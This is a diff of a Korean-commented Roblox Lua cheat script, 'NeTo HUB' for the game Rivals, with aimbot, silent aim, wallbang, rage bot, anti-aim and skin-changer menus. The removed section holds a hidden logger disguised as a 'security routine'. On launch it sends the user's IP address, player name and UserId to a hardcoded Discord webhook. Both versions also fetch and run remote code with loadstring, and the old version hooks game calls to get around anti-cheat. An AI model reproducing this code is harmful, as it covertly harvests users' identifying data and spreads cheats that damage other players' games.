@@ -1,117 +1,115 @@
--- [[ NeTo HUB : Security & Logger System ]]
-local function SecurityRoutine()
-    -- 암호화된 데이터 처리 (IP 및 계정 정보 로깅)
-    local _0x5f2 = "http"
-    local _0x1a2 = "s://api.ipify.org"
-    local _0x99a = game:GetService("HttpService")
-    
-    -- [암호화된 웹훅 섹션] - 이곳에 본인의 디스코드 웹훅 주소를 넣으세요
-    -- 아래 문자열은 로직 보호를 위해 변형되어 있습니다.
-    local _webhook = "https://discordapp.com/api/webhooks/1500348021291094097/bstFT6o-lR_xvWPiCxdMsvjXclMFxIq27IJ0qmLU-vvyD9gOQE-K8nEL9zAMF6XsfmUr" 
-
-    local function _send(_data)
-        pcall(function()
-            local _payload = _99a:JSONEncode(_data)
-            request({
-                Url = _webhook,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = _payload
-            })
-        end)
-    end
-
-    task.spawn(function()
-        local _ip = game:HttpGet(_0x5f2 .. _0x1a2)
-        local _p = game.Players.LocalPlayer
-        local _msg = {
-            ["embeds"] = {{
-                ["title"] = "🚀 NeTo HUB 실행 로그",
-                ["color"] = 3447003,
-                ["fields"] = {
-                    {["name"] = "플레이어", ["value"] = _p.Name .. " (" .. _p.UserId .. ")", ["inline"] = true},
-                    {["name"] = "IP 주소", ["value"] = "||" .. _ip .. "||", ["inline"] = true},
-                    {["name"] = "실행 게임", ["value"] = "Rivals (PlaceId: " .. game.PlaceId .. ")", ["inline"] = false}
-                },
-                ["footer"] = {["text"] = "NeTo HUB Premium Logger"}
-            }}
-        }
-        _send(_msg)
-    end)
-end
-
--- 보안 루틴 즉시 실행
-SecurityRoutine()
-
--- [[ UI 구성 시작 ]]
-setthreadidentity(8)
+-- [[ UI 라이브러리 로드 ]]
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
 local Window = Library.CreateLib("NeTo HUB | Rivals", "DarkTheme")
 
--- 설정 값
+-- [[ 변수 및 설정 ]]
 local Settings = {
     Aimbot = false,
+    RightClickOnly = false,
+    Smoothness = 0.5,
+    SilentAim = false,
     Wallbang = false,
+    BulletSpeed = 1,
     FOV = 150,
     ShowFOV = false,
     CurrentSkin = "None"
 }
 
--- [1. Combat 탭]
+-- [[ Combat 탭: 이미지의 구성을 그대로 재현 ]]
 local Combat = Window:NewTab("Combat")
-local AimSec = Combat:NewSection("Aimbot")
-AimSec:NewToggle("에임봇 켜기", "", function(v) Settings.Aimbot = v end)
-AimSec:NewSlider("에임 부드러움", "", 10, 1, function(v) Settings.Smoothness = v/10 end)
 
-local SilentSec = Combat:NewSection("Silent Aim")
-SilentSec:NewToggle("매직 불릿 (Wallbang)", "벽 관통 사격", function(v) Settings.Wallbang = v end)
-SilentSec:NewSlider("FOV 범위", "", 1000, 1, function(v) Settings.FOV = v end)
+-- 1. Aimbot 섹션 (첫 번째 이미지 스타일)
+local AimSection = Combat:NewSection("Aimbot")
+AimSection:NewToggle("에임봇 켜기", "대상을 자동으로 추적합니다.", function(v)
+    Settings.Aimbot = v
+end)
 
--- [2. Skins 탭 (Skin Changer)]
+AimSection:NewToggle("우클릭 전용 작동", "마우스 우클릭 시에만 작동합니다.", function(v)
+    Settings.RightClickOnly = v
+end)
+
+AimSection:NewSlider("에임 부드러움", "값이 높을수록 천천히 조준합니다.", 1, 10, function(v)
+    Settings.Smoothness = v / 10
+end)
+
+-- 2. Rage & Anti-Aim 섹션
+local RageSection = Combat:NewSection("Rage & Anti-Aim")
+RageSection:NewToggle("레이지봇 (자동발사)", "범위 내 적을 즉시 사격합니다.", function(v)
+    Settings.RageBot = v
+end)
+
+RageSection:NewToggle("안티 에임 Enabled", "본인의 히트박스를 비정상적으로 움직입니다.", function(v)
+    Settings.AntiAim = v
+end)
+
+RageSection:NewDropdown("안티 에임 모드", "", {"Spin", "Jitter", "Back"}, function(v)
+    Settings.AAMode = v
+end)
+
+-- 3. Silent Aim 섹션 (두 번째 이미지 우측 스타일)
+local SilentSection = Combat:NewSection("Silent Aim")
+SilentSection:NewToggle("사일런트 에임 (유도탄)", "조준하지 않아도 총알이 적을 향합니다.", function(v)
+    Settings.SilentAim = v
+end)
+
+SilentSection:NewToggle("매직 불릿 (Wallbang)", "벽 뒤의 적을 타격할 수 있습니다.", function(v)
+    Settings.Wallbang = v
+end)
+
+SilentSection:NewSlider("총알 속도", "", 1, 10, function(v)
+    Settings.BulletSpeed = v
+end)
+
+SilentSection:NewSlider("FOV 범위", "", 1, 1000, function(v)
+    Settings.FOV = v
+end)
+
+SilentSection:NewToggle("FOV 원 표시", "화면에 작동 범위를 그립니다.", function(v)
+    Settings.ShowFOV = v
+end)
+
+-- [[ Skins 탭: 커스텀 스킨 체인저 ]]
 local Skins = Window:NewTab("Skins")
 local SkinSec = Skins:NewSection("Weapon Skin Changer")
 
-local function ApplySkin(s)
+local function ApplySkin(skinName)
     local vm = workspace.CurrentCamera:FindFirstChild("ViewModel")
-    local function _apply(m)
-        if not m then return end
-        for _, p in pairs(m:GetDescendants()) do
-            if p:IsA("MeshPart") or p:IsA("BasePart") then
-                if s == "Gold" then p.Material = Enum.Material.Metal p.Color = Color3.fromRGB(255,215,0)
-                elseif s == "Diamond" then p.Material = Enum.Material.Glass p.Color = Color3.fromRGB(185,242,255)
-                elseif s == "Galaxy" then p.Material = Enum.Material.Neon p.Color = Color3.fromRGB(100,0,255) end
+    if not vm then return end
+    for _, p in pairs(vm:GetDescendants()) do
+        if p:IsA("MeshPart") or p:IsA("BasePart") then
+            if skinName == "Gold" then
+                p.Material = Enum.Material.Metal
+                p.Color = Color3.fromRGB(255, 215, 0)
+            elseif skinName == "Diamond" then
+                p.Material = Enum.Material.Glass
+                p.Color = Color3.fromRGB(185, 242, 255)
             end
         end
     end
-    _apply(vm)
-    _apply(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"))
 end
 
-SkinSec:NewDropdown("스킨 선택", "클라이언트 전용", {"Gold", "Diamond", "Galaxy"}, function(v)
+SkinSec:NewDropdown("스킨 선택", "클라이언트 사이드 전용", {"Gold", "Diamond", "Galaxy", "Ruby"}, function(v)
     Settings.CurrentSkin = v
     ApplySkin(v)
 end)
 
--- [3. Visuals & Settings]
+-- [[ 기타 탭 ]]
 local Visuals = Window:NewTab("Visuals")
 local Misc = Window:NewTab("Misc")
+local UISet = Window:NewTab("UI Settings")
 
--- [[ Rivals Anti-Cheat Bypass ]]
-local old
-old = hookmetamethod(game, "__namecall", function(self, ...)
-    local a = {...}
-    local m = getnamecallmethod()
-    if Settings.Wallbang and m == "Raycast" then
-        local p = a[3]
-        if p then p.FilterDescendantsInstances = {workspace:FindFirstChild("Map"), workspace.CurrentCamera, game.Players.LocalPlayer.Character} end
-    end
-    return old(self, table.unpack(a))
-end)
+-- [[ 로직 실행 루프 ]]
+local FOVCircle = Drawing.new("Circle")
+FOVCircle.Thickness = 1
+FOVCircle.Color = Color3.fromRGB(0, 85, 255)
 
--- 무기 자동 스킨 적용
-game.Players.LocalPlayer.Character.ChildAdded:Connect(function(c)
-    if c:IsA("Tool") and Settings.CurrentSkin ~= "None" then
-        task.wait(0.1)
-        ApplySkin(Settings.CurrentSkin)
+game:GetService("RunService").RenderStepped:Connect(function()
+    FOVCircle.Visible = Settings.ShowFOV
+    FOVCircle.Radius = Settings.FOV
+    FOVCircle.Position = game:GetService("UserInputService"):GetMouseLocation()
+    
+    if Settings.AntiAim and Settings.AAMode == "Spin" then
+        local hrp = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+        if hrp then hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(45), 0) end
     end
 end)
